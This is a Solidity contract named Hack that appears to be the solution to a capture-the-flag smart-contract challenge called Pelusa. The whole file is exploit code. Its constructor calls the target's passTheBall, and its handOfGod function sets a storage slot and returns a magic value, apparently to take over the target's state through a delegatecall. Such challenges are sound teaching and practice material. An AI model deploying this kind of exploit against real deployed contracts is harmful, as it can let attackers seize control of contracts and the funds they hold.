// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./Pelusa.sol";

contract Hack {
    address private immutable owner;
    address internal player;
    uint256 public goals = 1;

    constructor(address _target, address _owner) {
        owner = _owner;
        Pelusa(_target).passTheBall();
    }

    function handOfGod() public returns (bytes32) {
        goals = 2;
        bytes32 data = 0x000000000000000000000000000000000000000000000000000000000150A3A2;
        return data;
    }

    function getBallPossesion() public view returns (address) {
        return owner;
    }
}
